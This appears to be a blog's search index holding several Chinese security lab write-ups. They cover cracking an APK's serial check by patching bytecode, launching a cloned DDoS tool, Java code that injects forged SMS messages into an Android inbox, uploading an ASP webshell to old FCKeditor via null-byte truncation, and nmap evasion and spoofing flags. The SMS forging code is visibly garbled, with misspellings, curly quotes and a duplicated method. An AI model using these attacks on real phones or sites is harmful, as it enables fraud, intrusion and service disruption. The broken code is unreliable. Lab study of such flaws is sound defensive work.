<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APK静态分析</title>
    <url>/blog/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
<ul>
<li>了解APK（DEX）静态分析的基本步骤</li>
<li>掌握使用IDApro辅助进行静态分析的方法</li>
</ul>
<p>原理：</p>
<ul>
<li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li>
<li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li>
</ul>
<p>过程：</p>
<p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p>
<p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p>
<p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p>
<p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p>
<p>打开crackeme0502，点击“获取注解”按钮<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p>
<p>打开crackme0502，点击“检测注册码”按钮<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p>
<p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p>
<p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p>
<p>MainActivity$1.onClick@VL <img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p>
<p>MainActivity$2.onClick@VL <img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p>
<p>按空格键将IDA切换至“流程视图”<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p>
<p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p>
<p>然后切换至HEX-view 1选项卡<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p>
<p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p>
<p>ctrl+f寻找,将38改为39</p>
<p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p>
<p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p>
<p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>
]]></content>
      <tags>
        <tag>APK</tag>
        <tag>逆向</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>DDos攻击</title>
    <url>/blog/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ddos</tag>
        <tag>python</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>APP加壳</title>
    <url>/blog/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</url>
    <content><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p>
<ul>
<li>熟悉常用Android编译工具的使用</li>
</ul>
<p>原理：</p>
<ul>
<li><p>APP加壳是在二进制的程序中植入一段代码，在程序的外面再包裹上一段代码，在运行的时候优先取得程序的控制权，保护里面的代码不被非法修改或反编译。</p>
</li>
<li><p>AndroidDex文件加壳涉及到三个程序：①加壳程序：对源Apk进行加密和脱壳项目的Dex的合并；②脱壳程序：解密壳数据；③源程序：需要加壳处理的被保护代码。</p>
</li>
<li><p>APP加壳的优势在于保护核心代码,提高破解的难度,还可以缓解代码注注入攻击。缺点是影响程序的运行效率。</p>
</li>
</ul>
<p>过程：</p>
<p>导入项目ForceApkObj,点击源程序项目。<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085141078.png" alt="image-20211229085141078"></p>
<p>右键项目，选择<code>Android Tools</code>,<code>Export Signed Application Package</code><img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085259329.png" alt="image-20211229085259329"></p>
<p>默认，点击next<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085322221.png" alt="image-20211229085322221"></p>
<p>选择<code>create keystore</code>,点击browse选择目录，密码随便设（123456），填完参数点击next<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085707268.png" alt="image-20211229085707268"></p>
<p>创建密钥信息（SimpleEdu11;123456;123456;100;SimpleEdu），点击next<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085847492.png" alt="image-20211229085847492"></p>
<p>选择APK生成位置，点击Browse，默认为SimpleEdu11<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085932751.png" alt="image-20211229085932751"></p>
<p>点击finish完成操作<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085956125.png" alt="image-20211229085956125"></p>
<p>成功生成源程序APK文件<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229090057678.png" alt="image-20211229090057678"></p>
<p>右击脱壳程序项目ReforceApk，点击<code>Android Tools</code>，<code>Export UnSigned Application Package</code><img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229090206565.png" alt="image-20211229090206565"></p>
<p>接下来的步骤和源程序相同，生成脱壳程序APK<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229090304049.png" alt="image-20211229090304049"></p>
<p>右击脱壳程序apk，解压到…，得到解压文件</p>
<p>修改dex文件的名称为ForceApkObj.dex<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229091116540.png" alt="image-20211229091116540"></p>
<p>将FoceApkOBj.dex文件与ForceApkObj.apk文件放在C:\AndroidSec\SimpleEdu11\DexShellTools\force，如下为加壳程序的代码，它的作用是将源程序APK和脱壳程序dex文件合成新的dex文件<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229091826511.png" alt="image-20211229091826511"></p>
<p>点击按键<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229091948817.png" alt="image-20211229091948817"></p>
<p>选择<code>Debug As</code>，<code>2</code><img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092002112.png" alt="image-20211229092002112"></p>
<p>成功运行<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092026132.png" alt="image-20211229092026132"></p>
<p>按照导入的文件路径，找到生成的dex文件<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092046674.png" alt="image-20211229092046674"></p>
<p>右击脱壳程序，用压缩工具打开<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092237838.png" alt="image-20211229092237838"></p>
<p>将class文件替换脱壳程序中的dex文件<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092303091.png" alt="image-20211229092303091"></p>
<p>重新签名，将之前替换好的APK放入<code>APK重签名</code>文件中<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092406804.png" alt="image-20211229092406804"></p>
<p>双击签名程序后生成NewApk.apk<img src="https://gitee.com/oxchang/img-host/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092513149.png" alt="image-20211229092513149"></p>
]]></content>
      <tags>
        <tag>APP</tag>
        <tag>加壳</tag>
      </tags>
  </entry>
  <entry>
    <title>Android安全之短信欺诈漏洞</title>
    <url>/blog/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>目的：</p>
<ul>
<li>通过JAVA编程理解Android手机安全漏洞的基本原理</li>
<li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li>
</ul>
<p>原理：</p>
<ul>
<li>漏洞原理介绍</li>
<li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li>
<li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li>
<li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li>
</ul>
<p>过程：</p>
<p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p>
<p>选择simpleedu28项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p>
<p>导入后的项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p>
<p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p>
<p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p>
<p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p>
<p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p>
<p>右键MSGDEMO2，选择run as-android application按钮<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p>
<p>虚拟端返回运行后结果<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p>
<p>点击发送，手机接收欺诈短信</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>短信</tag>
        <tag>欺诈</tag>
      </tags>
  </entry>
  <entry>
    <title>Fckeditor漏洞上传webshell</title>
    <url>/blog/2021/12/27/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/</url>
    <content><![CDATA[<p>目的：Fckeditor为在线网页编辑器。本实验演示<code>Fckeditor2.4.2</code>以下版本的一个编辑器上传漏洞。</p>
<p>原理：Fckeditor在2.4.2以下存在一个直接上传任意文件的上传页面，可直接上传webshell。</p>
<p>过程：</p>
<p>打开网站<code>http://ip:8001/fckeditor</code>,判断是否有fckeditor编辑器，出现403禁止访问，说明此目录存在<br><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/1.JPG"></p>
<p>判断fckeditor编辑器版本号，输入<code>http://ip:8001/FCKeditor/_whatsnew.html</code>,返回页面可知fckeditor版本为2.0</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/2.JPG"></p>
<p>此版本的fckeditor存在两个上传漏洞页面：<br><code>FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</code><br><code>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=zhang&amp;CurrentFolder=/</code></p>
<p>第一个页面实在网站根目录下的<code>userfiles</code>目录下的<code>Image</code>目录下打开一个上传页面，上传的文件都保存在这个目录下，第二是在网站跟了目录下创建一个zhang目录</p>
<p><a href="http://ip:8001/FCKeditor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp">http://ip:8001/FCKeditor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</a></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/3.JPG"></p>
<p>先上传一个正常图片并查看返回结果，上传图片为1.jpg</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/4.JPG"></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/5.JPG"></p>
<p>重新上传一个asp一句话，不允许上传</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/6.JPG"></p>
<p>尝试使用00截断的方法再次上传，打开burpsuite</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/7.JPG"></p>
<p>火狐浏览器设置代理，为127.0.0.1:8080</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/8.JPG"></p>
<p>返回浏览器，重新上传文件，burp抓取到刷新的数据包，多次点击<code>forward</code>，直到浏览器显示页面</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/9.JPG"></p>
<p>切换到浏览器，将2.asp改为2.asp.jpg，并上传</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/10.JPG"></p>
<p>此时burp会拦截上传的数据包</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/11.JPG"></p>
<p>点击<code>HEX</code>，切换hex模式,修改此处内容</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/12.JPG"></p>
<p>将<code>2e</code>修改为<code>00</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/13.JPG"></p>
<p>切换为raw，点击forward，发送请求，再次刷新上传页面，发现asp文件已经上传成功</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/14.JPG"></p>
]]></content>
      <tags>
        <tag>-fckeditor -webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap简单使用</title>
    <url>/blog/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>

<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>beef+metasploit利用浏览器获取shell</title>
    <url>/blog/2021/12/20/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/</url>
